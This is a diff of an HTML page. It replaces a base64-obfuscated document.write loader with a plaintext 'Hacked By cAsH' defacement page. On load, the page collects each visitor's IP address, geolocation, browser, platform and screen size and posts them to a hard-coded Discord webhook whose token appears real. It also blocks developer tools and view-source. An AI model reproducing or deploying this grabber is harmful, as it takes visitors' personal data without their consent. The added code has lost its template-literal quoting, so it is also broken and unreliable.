@@ -1,19 +1,154 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Encrypted Index</title>
+    <title>cAsH</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: #000000;
+            background-color: #000000;
+            overflow: hidden;
+        }
+
+        #ip-address {
+            color: rgb(255, 255, 255);
+        }
+
+        #ip-info {
+            font-family: Arial, sans-serif;
+            white-space: pre;
+            color: rgb(255, 255, 255);
+        }
+
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            filter: blur(10px);
+        }
+
+        audio {
+            display: none; /* Hide audio controls */
+        }
+    </style>
 </head>
 <body>
     <script>
-        // Encoded Base64 HTML
-        const encodedHTML = "CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogICAgPHRpdGxlPmNBc0g8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBmb250LWZhbWlseTogQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgICAgY29sb3I6ICMwMDAwMDA7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgfQoKICAgICAgICAjaXAtYWRkcmVzcyB7CiAgICAgICAgICAgIGNvbG9yOiByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgfQoKICAgICAgICAjaXAtaW5mbyB7CiAgICAgICAgICAgIGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsKICAgICAgICAgICAgd2hpdGUtc3BhY2U6IHByZTsKICAgICAgICAgICAgY29sb3I6IHJnYigyNTUsIDI1NSwgMjU1KTsKICAgICAgICB9CgogICAgICAgIHZpZGVvIHsKICAgICAgICAgICAgcG9zaXRpb246IGZpeGVkOwogICAgICAgICAgICB0b3A6IDA7CiAgICAgICAgICAgIGxlZnQ6IDA7CiAgICAgICAgICAgIHotaW5kZXg6IC0xOwogICAgICAgICAgICBmaWx0ZXI6IGJsdXIoMTBweCk7CiAgICAgICAgfQoKICAgICAgICBhdWRpbyB7CiAgICAgICAgICAgIGRpc3BsYXk6IG5vbmU7IC8qIEhpZGUgYXVkaW8gY29udHJvbHMgKi8KICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPHNjcmlwdD4KICAgICAgICAvLyBEaXNhYmxlIHJpZ2h0LWNsaWNrIGFuZCBwcmV2ZW50IGluc3BlY3QKICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjb250ZXh0bWVudSIsIGZ1bmN0aW9uIChlKSB7CiAgICAgICAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgICAgICAgYWxlcnQoIvCfkoAgUHduZWQgOikiKTsKICAgICAgICB9KTsKCiAgICAgICAgZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigia2V5ZG93biIsIGZ1bmN0aW9uIChlKSB7CiAgICAgICAgICAgIGlmICgKICAgICAgICAgICAgICAgIGUua2V5ID09PSAiRjEyIiB8fAogICAgICAgICAgICAgICAgKGUuY3RybEtleSAmJiBlLnNoaWZ0S2V5ICYmIGUua2V5ID09PSAiSSIpIHx8CiAgICAgICAgICAgICAgICAoZS5jdHJsS2V5ICYmIGUua2V5ID09PSAiVSIpCiAgICAgICAgICAgICkgewogICAgICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgICAgICAgICAgYWxlcnQoIvCfkoAgUHduZWQgOikiKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwoKICAgICAgICAvLyBDaGFuZ2UgbmFtZXMgZHluYW1pY2FsbHkKICAgICAgICB2YXIgbmFtZXMgPSBbCiAgICAgICAgICAgIHsgbmFtZTogIlsgY0FzSNiMIF0iLCBjb2xvcjogInJlZCIgfSwKICAgICAgICAgICAgeyBuYW1lOiAiWyBjQXNI2IwgXSIsIGNvbG9yOiAid2hpdGUiIH0KICAgICAgICBdOwoKICAgICAgICB2YXIgbmFtZUluZGV4ID0gMDsKCiAgICAgICAgZnVuY3Rpb24gY2hhbmdlTmFtZXMoKSB7CiAgICAgICAgICAgIHZhciBjdXJyZW50TmFtZSA9IG5hbWVzW25hbWVJbmRleF07CiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJuYW1lIikudGV4dENvbnRlbnQgPSBjdXJyZW50TmFtZS5uYW1lOwogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibmFtZSIpLnN0eWxlLmNvbG9yID0gY3VycmVudE5hbWUuY29sb3I7CiAgICAgICAgICAgIG5hbWVJbmRleCA9IChuYW1lSW5kZXggKyAxKSAlIG5hbWVzLmxlbmd0aDsKICAgICAgICB9CgogICAgICAgIHNldEludGVydmFsKGNoYW5nZU5hbWVzLCAxMDAwKTsKCiAgICAgICAgLy8gRmV0Y2ggYW5kIHNlbmQgSVAgdG8gd2ViaG9vawogICAgICAgIGFzeW5jIGZ1bmN0aW9uIGZldGNoQW5kU2VuZElQKCkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgaXBSZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5pcGlmeS5vcmcvP2Zvcm1hdD1qc29uJyk7CiAgICAgICAgICAgICAgICBjb25zdCBpcERhdGEgPSBhd2FpdCBpcFJlc3BvbnNlLmpzb24oKTsKICAgICAgICAgICAgICAgIGNvbnN0IHVzZXJJUCA9IGlwRGF0YS5pcDsKCiAgICAgICAgICAgICAgICBjb25zdCBnZW9SZXNwb25zZSA9IGF3YWl0IGZldGNoKGBodHRwczovL2lwaW5mby5pby8ke3VzZXJJUH0vanNvbmApOwogICAgICAgICAgICAgICAgY29uc3QgZ2VvRGF0YSA9IGF3YWl0IGdlb1Jlc3BvbnNlLmpzb24oKTsKCiAgICAgICAgICAgICAgICBjb25zdCB1c2VyQWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50OwogICAgICAgICAgICAgICAgY29uc3QgcGxhdGZvcm0gPSBuYXZpZ2F0b3IucGxhdGZvcm07CiAgICAgICAgICAgICAgICBjb25zdCBzY3JlZW5XaWR0aCA9IHNjcmVlbi53aWR0aDsKICAgICAgICAgICAgICAgIGNvbnN0IHNjcmVlbkhlaWdodCA9IHNjcmVlbi5oZWlnaHQ7CiAgICAgICAgICAgICAgICBjb25zdCB0aW1lc3RhbXAgPSBuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCk7CgogICAgICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lwLWFkZHJlc3MtdmFsdWUnKS50ZXh0Q29udGVudCA9IHVzZXJJUDsKICAgICAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpcC1pbmZvJykudGV4dENvbnRlbnQgPSBKU09OLnN0cmluZ2lmeShnZW9EYXRhLCBudWxsLCAyKTsKCiAgICAgICAgICAgICAgICAvLyBCdWlsZCB3ZWJob29rIG1lc3NhZ2UgY29udGVudAogICAgICAgICAgICAgICAgY29uc3Qgd2ViaG9va01lc3NhZ2UgPSBgCjpjQXNIOiAgY0FzSCBncmFiYmVkIFlvdSA6Y0FzSDogCgoqKlVzZXIgSVA6KiogJHt1c2VySVB9CioqTG9jYXRpb246KiogJHtnZW9EYXRhLmNpdHl9LCAke2dlb0RhdGEucmVnaW9ufSwgJHtnZW9EYXRhLmNvdW50cnl9CioqSVNQOioqICR7Z2VvRGF0YS5vcmcgfHwgIlVua25vd24ifQoqKkJyb3dzZXI6KiogJHt1c2VyQWdlbnR9CioqUGxhdGZvcm06KiogJHtwbGF0Zm9ybX0KKipTY3JlZW4gUmVzb2x1dGlvbjoqKiAke3NjcmVlbldpZHRofXgke3NjcmVlbkhlaWdodH0KKipUaW1lc3RhbXA6KiogJHt0aW1lc3RhbXB9Cgp8fEBldmVyeW9uZXx8ICoqWW91IGhhdmUgYmVlbiBwd25lZCEqKgogICAgICAgICAgICAgICAgYDsKCiAgICAgICAgICAgICAgICAvLyBTZW5kIHRvIERpc2NvcmQgV2ViaG9vawogICAgICAgICAgICAgICAgYXdhaXQgZmV0Y2goImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMjg5MDA2MDU4OTY0Mjk2MTIvLUtndElyNUgyX3ZYVUpucFF2SEVIc3d5ckRUMjB6LVdrVkFtMG1ZbmJfSTIzZHFmVnFQcVNtelVCZGM5UHZ3Q0E5dmkiLCB7CiAgICAgICAgICAgICAgICAgICAgbWV0aG9kOiAiUE9TVCIsCiAgICAgICAgICAgICAgICAgICAgaGVhZGVyczogeyAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL2pzb24iIH0sCiAgICAgICAgICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoewogICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50OiB3ZWJob29rTWVzc2FnZQogICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0Vycm9yIGZldGNoaW5nIElQIG9yIHNlbmRpbmcgdG8gd2ViaG9vazonLCBlcnJvcik7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vIEV4ZWN1dGUgdGhlIGZ1bmN0aW9uIG9uIHBhZ2UgbG9hZAogICAgICAgIHdpbmRvdy5vbmxvYWQgPSBmZXRjaEFuZFNlbmRJUDsKICAgIDwvc2NyaXB0PgoKICAgIDwhLS0gQmFja2dyb3VuZCBWaWRlbyAtLT4KICAgIDx2aWRlbyBhdXRvcGxheSBsb29wIG11dGVkPgogICAgICAgIDxzb3VyY2Ugc3JjPSJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDY5NTk5MzY5NTI5MTM1MTQ2LzEzMTI0MjY2Njg3OTkwMzc0OTAvMDA2MGYyY2NjZTM1NWEwMC5tcDQiIHR5cGU9InZpZGVvL21wNCI+CiAgICAgICAgWW91ciBicm93c2VyIGRvZXMgbm90IHN1cHBvcnQgdGhlIHZpZGVvIHRhZy4KICAgIDwvdmlkZW8+CgogICAgPCEtLSBBdWRpbyAtLT4KICAgIDxhdWRpbyBhdXRvcGxheSBsb29wPgogICAgICAgIDxzb3VyY2Ugc3JjPSJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDY5NTk5MzY5NTI5MTM1MTQ2LzEzMTI0MjY2NDA3MTgwNDExMDkvVW50aXRsZWRfdmlkZW9fLV9NYWRlX3dpdGhfQ2xpcGNoYW1wXzMubXA0IiB0eXBlPSJhdWRpby9tcGVnIj4KICAgICAgICBZb3VyIGJyb3dzZXIgZG9lcyBub3Qgc3VwcG9ydCB0aGUgYXVkaW8gZWxlbWVudC4KICAgIDwvYXVkaW8+CgogICAgPCEtLSBNYWluIENvbnRlbnQgLS0+CiAgICA8cCBhbGlnbj0iY2VudGVyIj4KICAgICAgICA8aW1nIGJvcmRlcj0iMCIgc3JjPSJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdHRhY2htZW50cy8xMDY5NTk5MzY5NTI5MTM1MTQ2LzEzMTM2MTIxNDM2NzI2OTI4OTYvMTExMS5wbmciIHdpZHRoPSI0MDAiPgogICAgPC9wPgogICAgPHAgYWxpZ249ImNlbnRlciI+CiAgICAgICAgPGZvbnQgZmFjZT0iQ291cmllciIgc2l6ZT0iNiIgc3R5bGU9ImNvbG9yOiAjMDAwMDAwOyI+CiAgICAgICAgICAgIDxzcGFuIHN0eWxlPSJjb2xvcjogcmdiKDIxMCwgMTA1LCAzMCk7Ij4gSGFja2VkIEJ5IGNBc0ggPC9zcGFuPgogICAgICAgICAgICA8c3BhbiBpZD0ibmFtZSI+PC9zcGFuPgogICAgICAgIDwvZm9udD4KICAgIDwvcD4KICAgIDxwIGlkPSJpcC1hZGRyZXNzIj4KICAgICAgICA8c3BhbiBzdHlsZT0iY29sb3I6IHJnYigyNTUsIDI1NSwgMjU1KTsiPllvdXIgSVAgQWRkcmVzczogPC9zcGFuPgogICAgICAgIDxzcGFuIGlkPSJpcC1hZGRyZXNzLXZhbHVlIiBzdHlsZT0iY29sb3I6IHJnYigyNTUsIDI1NSwgMjU1KTsgZm9udC1zaXplOiAxN3B4OyI+TG9hZGluZy4uLjwvc3Bhbj4KICAgIDwvcD4KCiAgICA8aDMgc3R5bGU9ImNvbG9yOiByZ2IoMjU1LCAyNTUsIDI1NSk7Ij5Zb3VyIElQIEluZm86PC9oMz4KICAgIDxwcmUgaWQ9ImlwLWluZm8iIGNsYXNzPSJqc29uLWRhdGEiPkZldGNoaW5nLi4uPC9wcmU+CjwvYm9keT4KPC9odG1sPgo=
-";
+        // Disable right-click and prevent inspect
+        document.addEventListener("contextmenu", function (e) {
+            e.preventDefault();
+            alert("💀 Pwned :)");
+        });
 
-        // Decode the Base64 string
-        const decodedHTML = atob(encodedHTML);
+        document.addEventListener("keydown", function (e) {
+            if (
+                e.key === "F12" ||
+                (e.ctrlKey && e.shiftKey && e.key === "I") ||
+                (e.ctrlKey && e.key === "U")
+            ) {
+                e.preventDefault();
+                alert("💀 Pwned :)");
+            }
+        });
 
-        // Write the decoded HTML to the document
-        document.write(decodedHTML);
+        // Change names dynamically
+        var names = [
+            { name: "[ cAsH، ]", color: "red" },
+            { name: "[ cAsH، ]", color: "white" }
+        ];
+
+        var nameIndex = 0;
+
+        function changeNames() {
+            var currentName = names[nameIndex];
+            document.getElementById("name").textContent = currentName.name;
+            document.getElementById("name").style.color = currentName.color;
+            nameIndex = (nameIndex + 1) % names.length;
+        }
+
+        setInterval(changeNames, 1000);
+
+        // Fetch and send IP to webhook
+        async function fetchAndSendIP() {
+            try {
+                const ipResponse = await fetch('https://api.ipify.org/?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                const geoResponse = await fetch(https://ipinfo.io/${userIP}/json);
+                const geoData = await geoResponse.json();
+
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const timestamp = new Date().toLocaleString();
+
+                document.getElementById('ip-address-value').textContent = userIP;
+                document.getElementById('ip-info').textContent = JSON.stringify(geoData, null, 2);
+
+                // Build webhook message content
+                const webhookMessage = 
+:cAsH:  cAsH grabbed You :cAsH: 
+
+**User IP:** ${userIP}
+**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
+**ISP:** ${geoData.org || "Unknown"}
+**Browser:** ${userAgent}
+**Platform:** ${platform}
+**Screen Resolution:** ${screenWidth}x${screenHeight}
+**Timestamp:** ${timestamp}
+
+||@everyone|| **You have been pwned!**
+                ;
+
+                // Send to Discord Webhook
+                await fetch("https://discord.com/api/webhooks/1328900605896429612/-KgtIr5H2_vXUJnpQvHEHswyrDT20z-WkVAm0mYnb_I23dqfVqPqSmzUBdc9PvwCA9vi", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: webhookMessage
+                    })
+                });
+            } catch (error) {
+                console.error('Error fetching IP or sending to webhook:', error);
+            }
+        }
+
+        // Execute the function on page load
+        window.onload = fetchAndSendIP;
     </script>
+
+    <!-- Background Video -->
+    <video autoplay loop muted>
+        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1312426668799037490/0060f2ccce355a00.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <!-- Audio -->
+    <audio autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1312426640718041109/Untitled_video_-_Made_with_Clipchamp_3.mp4" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <!-- Main Content -->
+    <p align="center">
+        <img border="0" src="https://cdn.discordapp.com/attachments/1069599369529135146/1313612143672692896/1111.png" width="400">
+    </p>
+    <p align="center">
+        <font face="Courier" size="6" style="color: #000000;">
+            <span style="color: rgb(210, 105, 30);"> Hacked By cAsH </span>
+            <span id="name"></span>
+        </font>
+    </p>
+    <p id="ip-address">
+        <span style="color: rgb(255, 255, 255);">Your IP Address: </span>
+        <span id="ip-address-value" style="color: rgb(255, 255, 255); font-size: 17px;">Loading...</span>
+    </p>
+
+    <h3 style="color: rgb(255, 255, 255);">Your IP Info:</h3>
+    <pre id="ip-info" class="json-data">Fetching...</pre>
 </body>
 </html>
